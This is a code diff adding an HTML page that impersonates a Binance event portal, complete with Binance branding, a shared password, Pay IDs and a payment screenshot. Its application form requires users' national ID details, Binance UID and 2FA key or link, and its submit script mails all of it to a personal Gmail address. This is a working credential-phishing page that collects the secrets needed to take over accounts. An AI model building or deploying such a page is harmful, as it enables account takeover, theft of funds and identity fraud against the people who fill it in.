@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Binance Campaign Portal</title>
+  <!-- Google Fonts & Font Awesome Icons -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+  <style>
+    :root {
+      --primary: #F3BA2F; /* Binance Signature Yellow */
+      --primary-hover: #e0a722;
+      --bg: #0b0e11;
+      --card-bg: rgba(24, 26, 32, 0.85);
+      --input-bg: rgba(14, 16, 20, 0.75);
+      --border: rgba(255, 255, 255, 0.08);
+      --border-focus: rgba(243, 186, 47, 0.5);
+      --text: #eaecef;
+      --text-muted: #848e9c;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+    }
+
+    body {
+      background-color: var(--bg);
+      background-image: 
+        radial-gradient(circle at 10% 10%, rgba(243, 186, 47, 0.12) 0%, transparent 45%),
+        radial-gradient(circle at 90% 90%, rgba(99, 102, 241, 0.08) 0%, transparent 45%);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 24px 14px;
+    }
+
+    .wrapper {
+      width: 100%;
+      max-width: 460px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid var(--border);
+      border-radius: 28px;
+      padding: 28px 22px;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.7);
+    }
+
+    /* Header */
+    .header {
+      text-align: center;
+      margin-bottom: 24px;
+    }
+
+    .avatar-wrap {
+      display: inline-block;
+      margin-bottom: 12px;
+      position: relative;
+    }
+
+    .avatar-wrap img {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      object-fit: contain;
+      background: #181a20;
+      padding: 6px;
+      border: 2px solid var(--primary);
+      box-shadow: 0 0 25px rgba(243, 186, 47, 0.3);
+    }
+
+    .header h1 {
+      font-size: 1.5rem;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      color: #ffffff;
+    }
+
+    .header p {
+      font-size: 0.82rem;
+      color: var(--text-muted);
+      margin-top: 4px;
+    }
+
+    /* Labels */
+    .section-label {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      color: var(--text-muted);
+      margin: 18px 0 8px 4px;
+      font-weight: 700;
+    }
+
+    .section-label i {
+      color: var(--primary);
+      font-size: 0.85rem;
+    }
+
+    /* Copy Input Groups */
+    .copy-group {
+      display: flex;
+      align-items: center;
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 5px 6px 5px 12px;
+      margin-bottom: 8px;
+      transition: all 0.2s ease;
+    }
+
+    .copy-group:focus-within {
+      border-color: var(--border-focus);
+      box-shadow: 0 0 12px rgba(243, 186, 47, 0.15);
+    }
+
+    .copy-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      outline: none;
+      color: #eaecef;
+      font-size: 0.86rem;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+
+    .btn-copy {
+      background: var(--primary);
+      color: #0b0e11;
+      border: none;
+      padding: 8px 14px;
+      border-radius: 8px;
+      font-size: 0.78rem;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      transition: all 0.15s ease;
+      white-space: nowrap;
+    }
+
+    .btn-copy:active {
+      transform: scale(0.95);
+    }
+
+    /* Pay ID Sub-user Tags */
+    .user-tag {
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--primary);
+      margin: 10px 0 4px 4px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    /* Media Attachment Card */
+    .media-card {
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-top: 4px;
+    }
+
+    .thumb-wrap {
+      width: 60px;
+      height: 60px;
+      border-radius: 10px;
+      overflow: hidden;
+      flex-shrink: 0;
+      background: #000;
+      border: 1px solid var(--border);
+    }
+
+    .thumb-wrap img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .media-info {
+      flex: 1;
+    }
+
+    .media-info span {
+      display: block;
+      font-size: 0.78rem;
+      color: var(--text-muted);
+      margin-bottom: 6px;
+    }
+
+    .btn-download {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      width: 100%;
+      background: #10b981;
+      color: #ffffff;
+      border: none;
+      padding: 9px 12px;
+      font-size: 0.82rem;
+      font-weight: 700;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.2s ease;
+    }
+
+    .btn-download:hover {
+      background: #059669;
+    }
+
+    /* Apply Action Button */
+    .btn-apply {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      width: 100%;
+      background: linear-gradient(135deg, #F3BA2F 0%, #e0a722 100%);
+      color: #0b0e11;
+      border: none;
+      padding: 14px;
+      border-radius: 14px;
+      font-size: 1rem;
+      font-weight: 800;
+      margin-top: 24px;
+      cursor: pointer;
+      box-shadow: 0 10px 24px -4px rgba(243, 186, 47, 0.4);
+      transition: all 0.2s ease;
+    }
+
+    .btn-apply:hover {
+      box-shadow: 0 14px 28px -4px rgba(243, 186, 47, 0.6);
+      transform: translateY(-1px);
+    }
+
+    /* Pop-up Modal */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(10px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      padding: 16px;
+      z-index: 1000;
+    }
+
+    .modal-overlay.active {
+      display: flex;
+    }
+
+    .modal-card {
+      background: #181a20;
+      border: 1px solid var(--border);
+      border-radius: 22px;
+      width: 100%;
+      max-width: 440px;
+      max-height: 90vh;
+      overflow-y: auto;
+      padding: 24px;
+      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.85);
+    }
+
+    .modal-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 20px;
+      border-bottom: 1px solid var(--border);
+      padding-bottom: 12px;
+    }
+
+    .modal-header h3 {
+      font-size: 1.15rem;
+      color: #fff;
+      font-weight: 700;
+    }
+
+    .btn-close {
+      background: transparent;
+      border: none;
+      color: var(--text-muted);
+      font-size: 1.4rem;
+      cursor: pointer;
+      line-height: 1;
+    }
+
+    .btn-close:hover {
+      color: #fff;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 0.8rem;
+      margin-bottom: 6px;
+      color: var(--text-muted);
+      font-weight: 600;
+    }
+
+    .form-group label .req {
+      color: #ef4444;
+    }
+
+    .form-control {
+      width: 100%;
+      background: var(--input-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 11px 13px;
+      color: #fff;
+      font-size: 0.88rem;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    .form-control:focus {
+      border-color: var(--primary);
+    }
+
+    .btn-submit-form {
+      width: 100%;
+      background: linear-gradient(135deg, #F3BA2F 0%, #e0a722 100%);
+      color: #0b0e11;
+      border: none;
+      padding: 13px;
+      border-radius: 12px;
+      font-size: 0.95rem;
+      font-weight: 800;
+      cursor: pointer;
+      margin-top: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    /* Toast Notification */
+    .toast {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%) translateY(-60px);
+      background: #181a20;
+      color: #fff;
+      border: 1px solid var(--border);
+      padding: 10px 20px;
+      border-radius: 9999px;
+      font-size: 0.82rem;
+      font-weight: 600;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      opacity: 0;
+      transition: all 0.25s ease;
+      z-index: 10000;
+    }
+
+    .toast.show {
+      transform: translateX(-50%) translateY(0);
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Floating Toast Notification -->
+  <div id="toast" class="toast">
+    <i class="fa-solid fa-circle-check" style="color: #10b981;"></i>
+    <span id="toastMsg">Copied!</span>
+  </div>
+
+  <div class="wrapper">
+    <div class="card">
+      
+      <!-- Header -->
+      <div class="header">
+        <div class="avatar-wrap">
+          <img src="https://i.postimg.cc/ZRSQ7vwG/binance-icon-logo-png-seeklogo-598330.png" alt="Binance Logo">
+        </div>
+        <h1>Binance Camping</h1>
+        <p>Official Event & Verification Portal</p>
+      </div>
+
+      <!-- 1. Event Link -->
+      <div class="section-label">
+        <i class="fa-solid fa-link"></i> Event Link
+      </div>
+      <div class="copy-group">
+        <input type="text" value="https://www.binance.com/en/activity/trading-competition/sep-global-referral?utm_source=Lite_Annoucement" readonly class="copy-input">
+        <button class="btn-copy" onclick="copyDynamicText(this)">
+          <i class="fa-regular fa-copy"></i> Copy
+        </button>
+      </div>
+
+      <!-- 2. Password -->
+      <div class="section-label">
+        <i class="fa-solid fa-key"></i> Password
+      </div>
+      <div class="copy-group">
+        <input type="text" value="Sayem#07" readonly class="copy-input" style="font-weight: 600; letter-spacing: 0.5px;">
+        <button class="btn-copy" onclick="copyDynamicText(this)">
+          <i class="fa-regular fa-copy"></i> Copy
+        </button>
+      </div>
+
+      <!-- 3. Binance Pay IDs -->
+      <div class="section-label">
+        <i class="fa-solid fa-wallet"></i> Binance Pay ID
+      </div>
+      
+      <!-- User 1 -->
+      <div class="user-tag"><i class="fa-regular fa-user"></i> Al_Rifat</div>
+      <div class="copy-group">
+        <input type="text" value="1260122411" readonly class="copy-input">
+        <button class="btn-copy" onclick="copyDynamicText(this)">
+          <i class="fa-regular fa-copy"></i> Copy
+        </button>
+      </div>
+
+      <!-- User 2 -->
+      <div class="user-tag"><i class="fa-regular fa-user"></i> Shanjida_Islam</div>
+      <div class="copy-group">
+        <input type="text" value="1260130161" readonly class="copy-input">
+        <button class="btn-copy" onclick="copyDynamicText(this)">
+          <i class="fa-regular fa-copy"></i> Copy
+        </button>
+      </div>
+
+      <!-- 4. Bkash Transaction Screenshot -->
+      <div class="section-label">
+        <i class="fa-regular fa-image"></i> bKash Transaction SS
+      </div>
+      <div class="media-card">
+        <div class="thumb-wrap">
+          <img src="https://i.postimg.cc/02xYHddv/Screenshot-20260920-235840.jpg" alt="Preview">
+        </div>
+        <div class="media-info">
+          <span>Download original full-size image</span>
+          <button class="btn-download" id="downBtn" onclick="directDownload('https://i.postimg.cc/02xYHddv/Screenshot-20260920-235840.jpg', 'Bkash_Transaction_SS.jpg')">
+            <i class="fa-solid fa-arrow-down-to-line"></i> Download
+          </button>
+        </div>
+      </div>
+
+      <!-- 5. Apply Button -->
+      <button class="btn-apply" onclick="openModal()">
+        <i class="fa-solid fa-file-signature"></i> Apply Now
+      </button>
+
+    </div>
+  </div>
+
+  <!-- Pop-up Application Modal -->
+  <div class="modal-overlay" id="applyModal">
+    <div class="modal-card">
+      <div class="modal-header">
+        <h3>Application Form</h3>
+        <button class="btn-close" onclick="closeModal()">&times;</button>
+      </div>
+
+      <form onsubmit="submitApplication(event)">
+        
+        <div class="form-group">
+          <label>Name (NID) <span class="req">*</span></label>
+          <input type="text" id="mName" class="form-control" placeholder="Full name as per NID" required>
+        </div>
+
+        <div class="form-group">
+          <label>NID Number</label>
+          <input type="text" id="mNid" class="form-control" placeholder="Enter NID number (Optional)">
+        </div>
+
+        <div class="form-group">
+          <label>Binance ID <span class="req">*</span></label>
+          <input type="text" id="mBinanceId" class="form-control" placeholder="Your Binance UID" required>
+        </div>
+
+        <div class="form-group">
+          <label>2FA Link <span class="req">*</span></label>
+          <input type="text" id="m2fa" class="form-control" placeholder="Enter 2FA Key or Link" required>
+        </div>
+
+        <div class="form-group">
+          <label>Password</label>
+          <input type="text" id="mPass" class="form-control" value="Sayem#07" readonly style="color: #848e9c; background: rgba(0,0,0,0.3);">
+        </div>
+
+        <div class="form-group">
+          <label>Contact Number</label>
+          <input type="tel" id="mContact" class="form-control" placeholder="Phone number (Optional)">
+        </div>
+
+        <div class="form-group">
+          <label>Priority</label>
+          <select id="mPriority" class="form-control" style="cursor: pointer;">
+            <option value="100%">100%</option>
+            <option value="90%">90%</option>
+            <option value="80%">80%</option>
+            <option value="60%">60%</option>
+          </select>
+        </div>
+
+        <button type="submit" class="btn-submit-form">
+          <i class="fa-solid fa-paper-plane"></i> Send Application
+        </button>
+
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // Copy Functionality
+    function copyDynamicText(btn) {
+      const input = btn.previousElementSibling;
+      navigator.clipboard.writeText(input.value).then(() => {
+        showToast("Copied to clipboard!");
+        
+        const originalHTML = btn.innerHTML;
+        btn.innerHTML = `<i class="fa-solid fa-check"></i> Copied`;
+        btn.style.background = "#10b981";
+        btn.style.color = "#ffffff";
+
+        setTimeout(() => {
+          btn.innerHTML = originalHTML;
+          btn.style.background = "";
+          btn.style.color = "";
+        }, 1800);
+      });
+    }
+
+    // Dynamic Toast Display
+    function showToast(msg) {
+      const toast = document.getElementById("toast");
+      document.getElementById("toastMsg").innerText = msg;
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 2300);
+    }
+
+    // Direct Image Download Handler
+    async function directDownload(url, filename) {
+      const btn = document.getElementById("downBtn");
+      const originalText = btn.innerHTML;
+      btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Downloading...`;
+
+      try {
+        const response = await fetch(url);
+        const blob = await response.blob();
+        const blobUrl = window.URL.createObjectURL(blob);
+        
+        const link = document.createElement("a");
+        link.href = blobUrl;
+        link.download = filename;
+        document.body.appendChild(link);
+        link.click();
+        
+        document.body.removeChild(link);
+        window.URL.revokeObjectURL(blobUrl);
+        showToast("Download completed!");
+      } catch (err) {
+        window.open(url, "_blank");
+      } finally {
+        btn.innerHTML = originalText;
+      }
+    }
+
+    // Modal Control
+    function openModal() {
+      document.getElementById("applyModal").classList.add("active");
+    }
+
+    function closeModal() {
+      document.getElementById("applyModal").classList.remove("active");
+    }
+
+    window.onclick = function(e) {
+      const modal = document.getElementById("applyModal");
+      if (e.target === modal) {
+        closeModal();
+      }
+    }
+
+    // Data Parsing & Direct Mailto Trigger
+    function submitApplication(e) {
+      e.preventDefault();
+
+      const name = document.getElementById("mName").value.trim();
+      const nid = document.getElementById("mNid").value.trim() || "N/A";
+      const binanceId = document.getElementById("mBinanceId").value.trim();
+      const twoFa = document.getElementById("m2fa").value.trim();
+      const pass = document.getElementById("mPass").value;
+      const contact = document.getElementById("mContact").value.trim() || "N/A";
+      const priority = document.getElementById("mPriority").value;
+
+      // Clean Structured Message Body
+      const bodyText = 
+`Binance Camping Application Details:
+----------------------------------------
+Name (NID)     : ${name}
+NID Number     : ${nid}
+Binance ID     : ${binanceId}
+2FA Link       : ${twoFa}
+Password       : ${pass}
+Contact Number : ${contact}
+Priority       : ${priority}
+----------------------------------------
+Submitted via Binance Camping Portal`;
+
+      const recipient = "mr.angry.sojib@gmail.com";
+      const subject = encodeURIComponent(`Binance Camping Application - ${name}`);
+      const body = encodeURIComponent(bodyText);
+
+      // Open Native Email App
+      window.location.href = `mailto:${recipient}?subject=${subject}&body=${body}`;
+      
+      closeModal();
+    }
+  </script>
+
+</body>
+  </html>
+  
